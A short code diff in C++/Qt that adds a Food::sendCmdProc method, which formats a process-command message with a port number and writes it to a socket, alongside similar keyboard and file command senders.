@@ -67,6 +67,14 @@ void Food::sendCmdKeybd(int port)
     mSock->write(codec->fromUnicode(data));
 }
 
+void Food::sendCmdProc(int port){
+    QString data;
+    data.append(CmdProc+CmdSplit);
+    data.append("PORT"+CmdSplit+QString::number(port));
+    data.append(CmdEnd);
+    mSock->write(codec->fromUnicode(data));
+}
+
 void Food::sendCmdFile(int port)
 {
     QString data;
